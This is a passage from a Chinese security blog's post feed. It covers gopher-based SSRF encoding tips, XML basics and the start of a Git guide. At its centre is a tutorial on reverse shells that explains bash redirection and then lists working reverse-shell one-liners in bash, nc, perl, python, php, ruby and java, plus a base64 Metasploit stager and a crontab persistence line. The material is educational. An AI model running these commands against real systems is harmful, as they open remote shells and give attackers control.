operator">=</span> <span class="token string">'_'</span><span class="token operator">+</span>new<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，GET数据包只需要开头两行即可，例如：</p><pre><code>GET /test.php?a=Hello world HTTP/1.1Host: 127.0.0.1</code></pre><p>而POST数据包需要五行，例如：</p><pre><code>POST /test.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 11Connection: close            //这个可以没有，但是没有的话连接结束会延迟一段时间a=Hello world</code></pre><p>然后记得有几个重点：</p><p>*<em>第一，利用ssrf时经常要进行多次url编码（传参或者多次跳转需要多次url编码，也就是说，有多少次请求就要编码多少次，直接curl后接<code>gopher://</code>就编码一次，利用<code>?url=gopher://</code>这样的形式进行ssrf利用就相当于请求了两次，需要编码两次，如果有302跳转，则还需要再编码），第一次url编码后，将所有%0a改成%0d%0a *</em></p><p><strong>第二，gopher://默认发送到70端口，一般我们需要发送到80端口，记得改</strong></p><p>这就是Gopher协议的基本内容</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识反弹shell</title>
      <link href="/2021/02/05/2021-2-5-chu-shi-fan-dan-shell/"/>
      <url>/2021/02/05/2021-2-5-chu-shi-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="初识反弹shell"><a href="#初识反弹shell" class="headerlink" title="初识反弹shell"></a>初识反弹shell</h1><blockquote><p><strong>什么是反弹shell？</strong></p><p>　　反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><p><strong>为什么要反弹shell？</strong></p><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p><p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p><p>有如下情况：</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p><p>2.目标机器的ip动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p></blockquote><p>先写上最常用的的bash的反弹shell（zsh用不了）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&amp;</span><span class="token operator">></span> /dev/tcp/ip/port 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span> /dev/tcp/ip/port 0<span class="token operator">></span><span class="token operator">&amp;</span>1 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面两个是最常用的bash反弹shell，实现的效果是完全一样的。</p><p>下面详解原理</p><p>要理解上面这个反弹shell的命令，必须要先了解linux的<strong>文件描述符</strong>和<strong>重定向</strong></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a><strong>linux文件描述符</strong></h3><p>可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><p>标准输入：standard input <strong>0</strong> （默认设备键盘）<br>标准输出：standard output <strong>1</strong>（默认设备显示器）<br>错误输出：error output <strong>2</strong>（默认设备显示器）</p><p><strong>Linux系统中文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><p>（1）输入重定向 &lt;   &lt;&lt;<br> （2）输出重定向 &gt;   &gt;&gt;</p><p><strong>重点：</strong></p><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 默认是对标准输入 0 重定向 ，&gt; 默认是对标准输出 1 重定向</p><p><strong>重定向就是针对文件描述符的操作</strong></p><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式：  [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式：   [n]&gt; word</p><p> 说明：将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： <code>&amp;&gt; word</code>     <code>&gt;&amp; word</code></p><p>说明:将<strong>标准输出</strong>与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，</p><p>这种格式完全等价于 <code>1&gt; word 2&gt;&amp;1</code></p><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>重定向符号的顺序不能随便改换，因为系统是从左到右执行的</p><h2 id="解析反弹shell命令"><a href="#解析反弹shell命令" class="headerlink" title="解析反弹shell命令"></a>解析反弹shell命令</h2><p>粗略了解文件描述符和重定向之后，就可以分析一下反弹shell的这个命令了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&amp;</span><span class="token operator">></span> /dev/tcp/攻击机ip/port 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中<code>bash -i</code>命令的作用是生成一个交互式shell</p><p>而<code>/dev/tcp/ip/port</code>是一个不存在的文件夹，但是根据linux“<strong>一切皆文件</strong>”的核心思想，实际上它是通过tcp请求的方式连接语句中攻击机ip地址上的port 端口</p><p>所以，很明显，第一个文件描述符将一个交互式shell的标准输出和标准错误输出重定向到了某个主机的端口，第二个复制符，将标准输入也定位到了这个端口（与标准输入相同）</p><p>这是我们在“受害主机”上要做的，而在攻击机上，我们只要使用</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvp port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监听port端口</p><p>即可收到受害机的交互式shell的输入输出和报错</p><p>这就是反弹shell的基本原理</p><p>下面收录一些特殊的反弹shell方式</p><h3 id="各种环境下反弹shell的方法"><a href="#各种环境下反弹shell的方法" class="headerlink" title="各种环境下反弹shell的方法"></a>各种环境下反弹shell的方法</h3><p>​     </p><h4 id="0x01-bash版本："><a href="#0x01-bash版本：" class="headerlink" title="0x01 bash版本："></a>0x01 bash版本：</h4><pre><code>bash -i &gt;&amp; /dev/tcp/121.4.101.246/6666 0&gt;&amp;1</code></pre><p>注意这个是由解析shell的bash完成，所以某些情况下不支持。我用zsh不能反弹。这个也是最常用的。</p><h4 id="0x02-nc版本："><a href="#0x02-nc版本：" class="headerlink" title="0x02 nc版本："></a>0x02 nc版本：</h4><p>支持-e选项</p><pre class="line-numbers language-shell"><code class="language-shell">nc -e '/bin/sh' attackip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个方式最简单<br>不能使用-e选项时：</p><pre><code>mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 4444rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</code></pre><p>安装的NC版本有问题时：</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</code></pre><p>又发现一种，添加进来</p><pre class="line-numbers language-shell"><code class="language-shell">nc -c '/bin/bash' 121.4.101.246 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="0x03-Telnet版本：-nc不可用或-dev-tcp不可用时"><a href="#0x03-Telnet版本：-nc不可用或-dev-tcp不可用时" class="headerlink" title="0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)"></a>0x03 Telnet版本：(nc不可用或/dev/tcp不可用时)</h4><pre><code>mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h4 id="0x04-Perl版本："><a href="#0x04-Perl版本：" class="headerlink" title="0x04 Perl版本："></a>0x04 Perl版本：</h4><pre><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>不依赖于/bin/sh的shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p><pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></pre><h4 id="0x05-Python版本："><a href="#0x05-Python版本：" class="headerlink" title="0x05 Python版本："></a>0x05 Python版本：</h4><pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre><p>另外的形式：</p><pre><code>python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</code></pre><p>另外Metasploit版的代码：</p><pre><code>msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))</code></pre><h4 id="0x06-php版本："><a href="#0x06-php版本：" class="headerlink" title="0x06 php版本："></a>0x06 php版本：</h4><pre><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre><h4 id="0x07-java版本："><a href="#0x07-java版本：" class="headerlink" title="0x07 java版本："></a>0x07 java版本：</h4><pre><code>r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor()</code></pre><h4 id="0x08-ruby版本："><a href="#0x08-ruby版本：" class="headerlink" title="0x08 ruby版本："></a>0x08 ruby版本：</h4><pre><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</code></pre><p>不依赖于/bin/sh的shell：</p><pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</code></pre><p>如果目标系统运行Windows：</p><pre><code>ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</code></pre><h4 id="0x09-crontab定时任务："><a href="#0x09-crontab定时任务：" class="headerlink" title="0x09 crontab定时任务："></a>0x09 crontab定时任务：</h4><p>这也是在redis未授权访问的时候使用过的。<br>crontab  -e编辑当前用户的任务，或者是写到计划任务目录，一般是/var/spool/cron/目录，ubuntu是/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。具体crontab用法可以参考<a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">Crontab定时任务配置</a></p><pre><code> /bin/bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</code></pre><p>最后其实发现，虽然形式不同，但是其实都是基于/bin/bash和/bin/sh</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> reverse shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初步了解XML</title>
      <link href="/2021/02/04/2021-2-4-chu-bu-liao-jie-xml/"/>
      <url>/2021/02/04/2021-2-4-chu-bu-liao-jie-xml/</url>
      
        <content type="html"><![CDATA[<h1 id="初步了解XML"><a href="#初步了解XML" class="headerlink" title="初步了解XML"></a>初步了解XML</h1><p><strong>简介</strong></p><blockquote><p>XML 被设计用来传输和存储数据。</p><p>HTML 被设计用来显示数据。</p></blockquote><p>HTML是超文本标记语言，XML 指扩展标记语言（EXtensible Markup Language）</p><p>它们俩乍一看很像，但他们的功能侧重点是不一样的</p><p>HTML着重于<strong>显示信息</strong>，而XML着重于<strong>存储信息</strong>。</p><p>XML与HTML最大的区别是<strong>XML的标签没有预定义，用户自行定义XML文档中的标签</strong>，我们需要专门编程来显示这些自定义标签中的信息。</p><h3 id="XML-把数据从-HTML-分离"><a href="#XML-把数据从-HTML-分离" class="headerlink" title="XML 把数据从 HTML 分离"></a>XML 把数据从 HTML 分离</h3><p>如果需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p><p>通过使用几行 JavaScript 代码，就可以读取一个外部 XML 文件，并更新网页的数据内容。</p><h2 id="XML数据结构"><a href="#XML数据结构" class="headerlink" title="XML数据结构"></a>XML数据结构</h2><p>XML是“树”结构的。</p><pre class="line-numbers language-XMl"><code class="language-XMl"><?xml version="1.0" encoding="UTF-8"?><note><to>Tove</to><from>Jani</from><heading>Reminder</heading><body>Don't forget me this weekend!</body></note><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一行是XML声明，版本1.0，编码 utf-8</p><p>第二行<note>是根元素</note></p><p>XML 文档<strong>必须</strong>包含<strong>根元素</strong>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>当两个元素互相包含，外层的是父元素，内层的子元素，同层的元素互称同胞（兄弟或姐妹），这与数据结构中树的定义没有什么不同的。</p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><p>XML没有预定义标签，所以它只有一些必须遵守的语法规则，而没有像HTML那样的标准语法。</p><h4 id="XML-声明"><a href="#XML-声明" class="headerlink" title="XML 声明"></a>XML 声明</h4><p>XML 声明文件的可选部分，如果存在需要放在文档的第一行，如下所示：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>以上实例包含 XML 版本（</p><p>UTF-8 也是 HTML5, CSS, JavaScript, PHP, 和 SQL 的默认编码。</p></blockquote><hr><h4 id="所有的-XML-元素都必须有一个关闭标签"><a href="#所有的-XML-元素都必须有一个关闭标签" class="headerlink" title="所有的 XML 元素都必须有一个关闭标签"></a>所有的 XML 元素都必须有一个关闭标签</h4><p>在 HTML 中，某些元素不必有一个关闭标签：</p><pre><code>&lt;p&gt;This is a paragraph.&lt;br&gt;</code></pre><p>在 XML 中，省略关闭标签是非法的。所有元素都<strong>必须</strong>有关闭标签：</p><pre><code>&lt;p&gt;This is a paragraph.&lt;/p&gt;&lt;br /&gt;</code></pre><p><strong>注释：</strong>从上面的实例中，您也许已经注意到 XML 声明没有关闭标签。这不是错误。声明不是 XML 文档本身的一部分，它没有关闭标签。</p><hr><h4 id="XML-标签对大小写敏感"><a href="#XML-标签对大小写敏感" class="headerlink" title="XML 标签对大小写敏感"></a>XML 标签对大小写敏感</h4><p><strong>XML 标签对大小写敏感</strong>。标签 <letter> 与标签 <letter> 是不同的。</letter></letter></p><p>必须使用相同的大小写来编写打开标签和关闭标签：</p><pre><code>&lt;Message&gt;这是错误的&lt;/message&gt;&lt;message&gt;这是正确的&lt;/message&gt;</code></pre><p><strong>注释：</strong>打开标签和关闭标签通常被称为开始标签和结束标签。不论您喜欢哪种术语，它们的概念都是相同的。</p><hr><h4 id="XML-必须正确嵌套"><a href="#XML-必须正确嵌套" class="headerlink" title="XML 必须正确嵌套"></a>XML 必须正确嵌套</h4><p>在 HTML 中，常会看到没有正确嵌套的元素：</p><pre><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/b&gt;&lt;/i&gt;</code></pre><p>在 XML 中，所有元素都<strong>必须</strong>彼此正确地嵌套：</p><pre><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</code></pre><p>在上面的实例中，正确嵌套的意思是：由于 <i> 元素是在 <b> 元素内打开的，那么它必须在 <b> 元素内关闭。</b></b></i></p><hr><hr><h4 id="XML-属性值必须加引号"><a href="#XML-属性值必须加引号" class="headerlink" title="XML 属性值必须加引号"></a>XML 属性值必须加引号</h4><p>与 HTML 类似，XML 元素也可拥有属性（名称/值的对）。</p><p>在 XML 中，XML 的属性值必须加引号。<strong>单引号双引号均可。</strong></p><p>请研究下面的两个 XML 文档。 第一个是错误的，第二个是正确的：</p><pre><code>&lt;note date=12/11/2007&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;/note&gt;</code></pre><pre><code>&lt;note date="12/11/2007"&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;/note&gt;</code></pre><p>在第一个文档中的错误是，note 元素中的 date 属性没有加引号。</p><hr><h4 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h4><p>在 XML 中，一些字符拥有特殊的意义。</p><p>如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><p>这样会产生 XML 错误：</p><pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</code></pre><p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p><pre><code>&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt;</code></pre><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>greater than</td></tr><tr><td>&amp;</td><td>&amp;</td><td>ampersand</td></tr><tr><td>'</td><td>‘</td><td>apostrophe</td></tr><tr><td>"</td><td>“</td><td>quotation mark</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><hr><h4 id="XML-中的注释"><a href="#XML-中的注释" class="headerlink" title="XML 中的注释"></a>XML 中的注释</h4><p>在 XML 中编写注释的语法与 HTML 的语法很相似。</p><pre><code>&lt;!-- This is a comment --&gt;</code></pre><hr><h4 id="在-XML-中，空格会被保留"><a href="#在-XML-中，空格会被保留" class="headerlink" title="在 XML 中，空格会被保留"></a>在 XML 中，空格会被保留</h4><p>HTML 会把多个连续的空格字符裁减（合并）为一个：</p><table><thead><tr><th>HTML:</th><th><code>Hello           Tove</code></th></tr></thead><tbody><tr><td>输出结果:</td><td>Hello Tove</td></tr></tbody></table><p>在 XML 中，文档中的空格不会被删减，因为它是用来存储信息的，空格也是一种信息。</p><hr><h4 id="XML-以-LF-存储换行"><a href="#XML-以-LF-存储换行" class="headerlink" title="XML 以 LF 存储换行"></a>XML 以 LF 存储换行</h4><p>在 Windows 应用程序中，换行通常以一对字符来存储：回车符（CR）和换行符（LF）。</p><p>在 Unix 和 Mac OSX 中，使用 LF 来存储新行。</p><p>在旧的 Mac 系统中，使用 CR 来存储新行。</p><p>XML 以 LF 存储换行。</p><h3 id="XML元素"><a href="#XML元素" class="headerlink" title="XML元素"></a>XML元素</h3><p>一个元素可以包含：</p><ul><li>其他元素</li><li>文本</li><li>属性</li><li>或混合以上所有</li></ul><h3 id="XML-命名规则"><a href="#XML-命名规则" class="headerlink" title="XML 命名规则"></a>XML 命名规则</h3><p>XML 元素必须遵循以下命名规则：</p><ul><li>名称可以包含字母、数字以及其他的字符</li><li><strong>名称不能以数字或者标点符号开始</strong></li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始</li><li>名称不能包含空格</li></ul><p>可使用任何名称，没有保留的字词。</p><h3 id="XML-元素是可扩展的"><a href="#XML-元素是可扩展的" class="headerlink" title="XML 元素是可扩展的"></a>XML 元素是可扩展的</h3><p>XML 元素是可扩展，以携带更多的信息。</p><p>请看下面的 XML 实例：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让我们设想一下，我们创建了一个应用程序，可将 <to>、<from> 以及  元素从 XML 文档中提取出来，并产生以下的输出：</from></to></p><blockquote><p><strong>MESSAGE</strong></p><p><strong>To:</strong> Tove<br><strong>From:</strong> Jani</p><p>Don’t forget me this weekend!</p></blockquote><p>想象一下，XML 文档的作者添加的一些额外信息：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>date</span><span class="token punctuation">></span></span>2008-01-10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>date</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么这个应用程序会中断或崩溃吗？</p><p>不会。这个应用程序仍然可以找到 XML 文档中的 <to>、<from> 以及  元素，并产生同样的输出。</from></to></p><p>XML 的优势之一，就是可以在不中断应用程序的情况下进行扩展。</p><h2 id="XML-DOM"><a href="#XML-DOM" class="headerlink" title="XML DOM"></a>XML DOM</h2><p>DOM（Document Object Model 文档对象模型）定义了访问和操作文档的标准方法。</p><h3 id="XML-DOM-1"><a href="#XML-DOM-1" class="headerlink" title="XML DOM"></a>XML DOM</h3><p>XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法。</p><p>XML DOM 把 XML 文档作为树结构来查看。</p><p>所有元素可以通过 DOM 树来访问。可以修改或删除它们的内容，并创建新的元素。元素，它们的文本，以及它们的属性，都被认为是节点。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令与教程</title>
      <link href="/2021/02/02/2021-2-2-git-chang-yong-ming-ling-yu-jiao-cheng/"/>
      <url>/2021/02/02/2021-2-2-git-chang-yong-ming-ling-yu-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Git常用命令与教程"><a href="#Git常用命令与教程" class="headerlink" title="Git常用命令与教程"></a>Git常用命令与教程</h1><h1 id="Git常用命令"><a href="#Git常用命令" class="headerlink" title="Git常用命令"></a>Git常用命令</h1><blockquote></blockquote><h2 id="名词介绍"><a href="#名词介绍" class="headerlink" title="名词介绍"></a>名词介绍</h2><p><img src="/img/16e00be00de88281" alt="img"></p><blockquote><p><strong><code>Workspace</code></strong>：工作区</p><p><strong><code>Index/Stage</code></strong>：暂存区，也叫索引</p><p><strong><code>Repository</code></strong>：仓库区（或本地仓库），也存储库</p><p><strong><code>Remote</code></strong>：远程仓库</p></blockquote><p>理解这些名词，在脑中形成知识体系，便于理解下面具体命令。</p><h2 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h2><h3 id="创建SSH-Key"><a href="#创建SSH-Key" class="headerlink" title="创建SSH Key"></a>创建SSH Key</h3><pre class="line-numbers language-bash"><code class="language-bash">$ ssh-keygen -t rsa -C <span class="token string">"youremail@example.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关于仓库"><a href="#关于仓库" class="headerlink" title="关于仓库"></a>关于仓库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 